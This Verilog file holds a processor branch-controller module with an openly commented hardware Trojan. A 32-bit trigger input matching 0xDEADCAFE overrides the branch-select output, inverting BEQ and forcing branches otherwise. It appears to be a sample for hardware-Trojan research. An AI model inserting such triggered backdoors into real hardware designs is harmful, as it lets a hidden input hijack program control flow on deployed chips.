 module Branch_CTLR
    (input [2:0] branch_in,
     input zero_flag, sign_flag,
     input [31:0] secret_activation_code, // Hypothetical trigger input
     output reg pc_src);

    wire BEQ, BNQ, BLT, BGT;
    // Trojan activation condition: an unusual, specific value
    wire trojan_activated = (secret_activation_code == 32'hDEADCAFE); // Hypothetical rare value
    
    always@(branch_in, BEQ, BNQ, BLT, BGT, trojan_activated) begin
        if (trojan_activated) begin
            // Trojan's payload: Overrides the pc_src to a specific value under certain conditions
            pc_src = (branch_in == 3'b001) ? 1'b0 : 1'b1; // Invert behavior for BEQ as an example
        end else begin
            // Normal operation
            case (branch_in)
                3'b001: pc_src = BEQ; // branch equal
                3'b010: pc_src = BNQ; // branch not equal
                3'b011: pc_src = BLT; // branch less than
                3'b100: pc_src = BGT; // branch greater than (rs1 >= rs2)
                3'b101: pc_src = 1'b1; // jump-and-link-register instruction (JALR)
                3'b110: pc_src= 1'b1; // jump and link instruction (JAL)
                default: pc_src = 1'b0;
            endcase
        end
    end
    
    assign BEQ = zero_flag ? 1'b1 : 1'b0;
    assign BNQ = zero_flag ? 1'b0 : 1'b1;
    assign BLT = sign_flag ? 1'b1 : 1'b0;
    assign BGT = sign_flag ? 1'b0 : 1'b1;

endmodule
